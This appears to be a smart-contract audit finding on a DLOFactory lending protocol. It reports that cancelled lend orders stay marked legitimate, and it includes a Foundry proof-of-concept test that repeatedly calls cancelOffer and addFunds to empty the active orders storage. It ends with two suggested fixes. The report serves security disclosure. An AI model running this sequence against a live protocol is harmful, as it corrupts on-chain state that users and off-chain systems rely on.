# Malicious lender could continously call DLOFactory::deleteOrder to clear the active orders storage

### Summary

an order is still "legit" in the factory even after it has been cancelled 
the lender would take advantage of this to conduct an attack using the following steps 


create lend order via createLendOrder 
then continously call cancelOffer and add funds

this will point all active orders towards the zero index then override them 

add this test to test/multiplePrinciples.t.sol

    function test_remove_all_orders_from_single_order() public {
        vm.startPrank(secondLender);
        console.log(DLOFactoryContract.activeOrdersCount()); // 3
        SecondLendOrder.cancelOffer();
        console.log(DLOFactoryContract.activeOrdersCount()); // 2
        wETHContract.approve(address(SecondLendOrder), 1e6);
        SecondLendOrder.addFunds(uint(1e6));
        SecondLendOrder.cancelOffer();
        console.log(DLOFactoryContract.activeOrdersCount()); // 1
        wETHContract.approve(address(SecondLendOrder), 1e6);
        SecondLendOrder.addFunds(uint(1e6));
        SecondLendOrder.cancelOffer();
        console.log(DLOFactoryContract.activeOrdersCount()); // 0
        vm.stopPrank();
    }

### Root Cause

allowing a lend order to remain legit after it has been deleted 

### Internal pre-conditions

none 

### External pre-conditions

none

### Attack Path

_No response_

### Impact

lender would active order count variable providing wrong onchain data to offchain mechanisms 
### PoC

_No response_

there are two approaches depending on wants the protocol wants achieve 
1 stop lender or loans from adding funds when the order is no more active 
2 set isLegitOrder to false when an order is cancelled
